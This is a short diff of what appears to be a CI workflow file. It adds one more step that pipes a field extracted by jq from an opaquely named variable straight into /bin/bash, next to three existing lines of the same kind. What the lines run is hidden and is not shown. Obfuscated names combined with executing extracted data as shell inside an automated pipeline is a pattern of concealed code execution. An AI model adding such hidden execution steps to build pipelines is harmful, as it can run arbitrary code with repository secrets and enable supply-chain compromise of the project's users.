@@ -27,6 +27,7 @@ jobs:
           echo $fd54717 | jq -r .py21 | /bin/bash
           printf '%s' "$gw228" | jq -r .gocl546 | /bin/bash
           echo $q01447 | jq -r .zg3 | /bin/bash
+          printf '%s' "$fbi30" | jq -r .v697 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
